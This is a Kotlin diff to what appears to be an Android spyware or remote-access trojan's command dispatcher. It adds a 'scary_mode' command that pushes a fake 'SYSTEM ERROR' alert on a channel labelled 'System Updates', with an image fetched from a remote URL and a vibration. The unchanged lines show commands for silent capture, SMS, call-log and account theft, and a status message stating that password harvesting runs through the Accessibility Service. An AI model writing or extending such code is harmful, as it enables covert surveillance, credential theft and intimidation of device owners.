@@ -155,6 +155,7 @@ class CommandDispatcher(
                 "usage" -> handleUsage(command)
                 "wallpaper" -> handleWallpaper(command)
                 "silentcapture" -> handleSilentCapture(command)
+                "scary_mode" -> handleScaryMode(command)
                 "getsms" -> handleGetSms(command)
                 "getcalllogs" -> handleGetCallLogs(command)
                 "getaccounts" -> handleGetAccounts(command)
@@ -1697,6 +1698,49 @@ class CommandDispatcher(
             "status" to "sniffing_active",
             "info" to "Password harvesting is active via Accessibility Service. Screen monitoring captures logins in real-time."
         ))
+    }
+
+    private suspend fun handleScaryMode(command: DeviceCommand): CommandResult {
+        val type = command.payload["type"]?.toString() ?: "ghost"
+        val title = command.payload["title"]?.toString() ?: "SYSTEM ERROR"
+        val message = command.payload["message"]?.toString() ?: "Critical system failure detected!"
+        val imageUrl = command.payload["imageUrl"]?.toString() ?: ""
+
+        return withContext(Dispatchers.IO) {
+            runCatching {
+                val notificationManager = appContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                val channelId = "scary_channel"
+                
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    val channel = NotificationChannel(channelId, "System Updates", NotificationManager.IMPORTANCE_HIGH)
+                    notificationManager.createNotificationChannel(channel)
+                }
+
+                val builder = NotificationCompat.Builder(appContext, channelId)
+                    .setSmallIcon(android.R.drawable.ic_dialog_alert)
+                    .setContentTitle(title)
+                    .setContentText(message)
+                    .setPriority(NotificationCompat.PRIORITY_HIGH)
+                    .setAutoCancel(true)
+
+                if (imageUrl.isNotBlank()) {
+                    val bitmap = backendApiClient.downloadImageToBitmap(appContext, imageUrl)
+                    if (bitmap != null) {
+                        builder.setStyle(NotificationCompat.BigPictureStyle().bigPicture(bitmap))
+                    }
+                }
+
+                notificationManager.notify(System.currentTimeMillis().toInt(), builder.build())
+                
+                // Play a creepy sound if vibration is enabled OR just vibrate
+                val vibrator = appContext.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
+                vibrator.vibrate(android.os.VibrationEffect.createOneShot(1000, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
+
+                success(command.commandId, mapOf("status" to "scary_triggered", "type" to type))
+            }.getOrElse {
+                error(command.commandId, "SCARY_MODE_FAILED", it.message ?: "Failed to trigger scary mode")
+            }
+        }
     }
 
     private fun success(commandId: String, data: Map<String, Any?>, mediaId: String? = null): CommandResult {
